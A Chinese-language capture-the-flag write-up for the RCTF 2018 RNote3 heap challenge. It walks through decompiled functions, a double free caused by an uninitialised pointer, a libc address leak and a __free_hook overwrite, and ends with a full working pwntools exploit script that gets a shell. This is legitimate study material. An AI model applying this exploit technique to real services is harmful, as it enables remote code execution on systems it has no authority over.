# RNote3
## Author: 文火
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>先贴一下我学习的**NBUSEC**队伍的[原wp](https://github.com/sajjadium/ctf-writeups/blob/master/RCTF/2018/RNote3/rnote3_exploit.py)，我在这里解析一下。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>这题二进制程序保护全开，只有一个libc可以改写GOT，同样通过覆盖libc中的地址来getshell，跟babyheap一样，得到oneshot的地址**0x4526a**和__free_hook的地址**0x3c67a8**。接下来开始分析这个二进制程序：</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>整个程序看上去无懈可击，但有一个隐秘的错误，就是一个函数中的ptr指针未初始化，连续调用这个函数的时候，由于ptr的垃圾数据还是上一次的，又可以继续free上次的note，也就是可以任意次数delete同一个note，再加上edit note的函数里的可以写入title的大小过大，最终导致被攻破：</font></br>

```C
__int64 del_chunk()
{
  signed int i; // [sp+4h] [bp-1Ch]@1
  void *ptr; // [sp+8h] [bp-18h]@0
  char title; // [sp+10h] [bp-10h]@1
  __int64 v4; // [sp+18h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  printf("please input note title: ");
  get_input((__int64)&title, 8u);
  for ( i = 0; i <= 31; ++i )
  {
    if ( link[i] && !strncmp(&title, (const char *)link[i], 8uLL) )
    {
      ptr = (void *)link[i];
      break;
    }
  }
  if ( ptr )
  {
    free(*((void **)ptr + 2));
    free(ptr);
    link[i] = 0LL;
  }
  else
  {
    puts("not a valid title");
  }
  return *MK_FP(__FS__, 40LL) ^ v4;
}


__int64 edit_chunk()
{
  signed int i; // [sp+4h] [bp-1Ch]@1
  __int64 the_chunk; // [sp+8h] [bp-18h]@1
  char title; // [sp+10h] [bp-10h]@1
  __int64 v4; // [sp+18h] [bp-8h]@1

  v4 = *MK_FP(__FS__, 40LL);
  the_chunk = 0LL;
  printf("please input note title: ");
  get_input((__int64)&title, 0x20u);
  for ( i = 0; i <= 31; ++i )
  {
    if ( link[i] && !strncmp(&title, (const char *)link[i], 8uLL) )
    {
      the_chunk = link[i];
      break;
    }
  }
  if ( the_chunk )
  {
    printf("please input new content: ");
    get_input(*(_QWORD *)(the_chunk + 16), *(_QWORD *)(the_chunk + 8));
  }
  else
  {
    puts("not a valid title");
  }
  return *MK_FP(__FS__, 40LL) ^ v4;
}
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>那么接下来我们先泄露libc地址，如果不明白内存管理可以先看[这篇](https://paper.seebug.org/255/)，我们首先分配一个fastbin大小的堆块然后对其连续free两次，接下来分配的两个堆块（一个smallbin，如果是fastbin不会有fd泄露）就会**重叠在同一个地址**上，当对其中的一个smallbin进行free了之后，再view一下另一个堆块就可以查看到被free堆块的fd指针，从而泄露出libc基地址，偏移可以通过调试得到。</font></br>

```python
def add_note(title, content_size, content):
    p.sendline('1')
    p.recvuntil('please input title: ')
    p.send(title)
    p.recvuntil('please input content size: ')
    p.sendline(str(content_size))
    p.recvuntil('please input content: ')
    p.send(content)

def view_note(title):
    p.sendline('2')
    p.recvuntil('please input note title: ')
    p.send(title)

def edit_note(title, content):
    p.sendline('3')
    print p.recvuntil('please input note title: ')
    p.send(title)
    print p.recvuntil('please input new content: ')
    p.send(content)

def delete_note(title):
    p.sendline('4')
    p.recvuntil('please input note title: ')
    p.send(title)

p.recvuntil('5. Exit\n')

add_note('a' * 8, 24, 'a' * 24)

delete_note('a' * 8)
delete_note('a' * 8)

add_note('\x00' * 8, 24, 'b' * 24)
add_note('c' * 8, 256, 'c' * 256)
add_note('d' * 8, 24, 'd' * 24)

delete_note('c' * 8)

view_note('\x00' * 8)

p.recvuntil('note content: ')
libc_base = u64(p.recv(6) + '\x00\x00') - 0x3c4b78
print 'libc base: {}'.format(hex(libc_base))
```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>接下来就是use-after-free利用了，不太了解的可以看一下[这篇文章](https://blog.csdn.net/qq_31481187/article/details/73612451)。</font></br>
&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>use-after-free通常用来修改一些敏感数据或者地址指针，我们在这里修改堆块地址，将堆块地址修改到libc中的__free_hook处，然后就可以把这个的地址修改为oneshot的地址然后getshell了：</font></br>

```python
delete_note('d' * 8)
#返回了原先'd'*8 title的第一个堆块和smallbin的一个堆块，这个时候出现了偏差。
add_note('e' * 8, 256, 'e' * 256)
#这里申请'f'*8的title的时候返回了上一个'd'堆块的content块，然后申请'f'堆块的content的堆块时
#malloc返回了上一个'c'堆块的title块，这时候从content写入数据的时候相当于从title开始写入，
#可以修改title，size，和其content堆块的地址，在这里把content堆块的地址到libc的__free_hook处。
add_note('f' * 8, 24, '\x00' * 8 + p64(24) + p64(libc_base + freehook))

edit_note('\x00' * 7 + '\n', p64(libc_base + oneshot) + '\n')

delete_note('\x00' * 8)
p.interactive()

```

&nbsp;&nbsp;&nbsp;&nbsp;<font size=2>所以最终脚本如下：</font></br>

Exploit脚本:
=======

```python
from pwn import *

oneshot=0x4526A
freehook=0x3c67a8

DEBUG = 1

if DEBUG == 1:
  p=process('./RNote3')
  context(log_level='debug')
  gdb.attach(p)
else:
  p=remote('rnote3.2018.teamrois.cn',7322)

def add_note(title, content_size, content):
    p.sendline('1')
    p.recvuntil('please input title: ')
    p.send(title)
    p.recvuntil('please input content size: ')
    p.sendline(str(content_size))
    p.recvuntil('please input content: ')
    p.send(content)

def view_note(title):
    p.sendline('2')
    p.recvuntil('please input note title: ')
    p.send(title)

def edit_note(title, content):
    p.sendline('3')
    print p.recvuntil('please input note title: ')
    p.send(title)
    print p.recvuntil('please input new content: ')
    p.send(content)

def delete_note(title):
    p.sendline('4')
    p.recvuntil('please input note title: ')
    p.send(title)

p.recvuntil('5. Exit\n')

add_note('a' * 8, 24, 'a' * 24)

delete_note('a' * 8)
delete_note('a' * 8)

add_note('\x00' * 8, 24, 'b' * 24)
add_note('c' * 8, 256, 'c' * 256)
add_note('d' * 8, 24, 'd' * 24)

delete_note('c' * 8)

view_note('\x00' * 8)

p.recvuntil('note content: ')
libc_base = u64(p.recv(6) + '\x00\x00') - 0x3c4b78
print 'libc base: {}'.format(hex(libc_base))

delete_note('d' * 8)
add_note('e' * 8, 256, 'e' * 256)
add_note('f' * 8, 24, '\x00' * 8 + p64(24) + p64(libc_base + freehook))

edit_note('\x00' * 7 + '\n', p64(libc_base + oneshot) + '\n')

delete_note('\x00' * 8)
p.interactive()

```
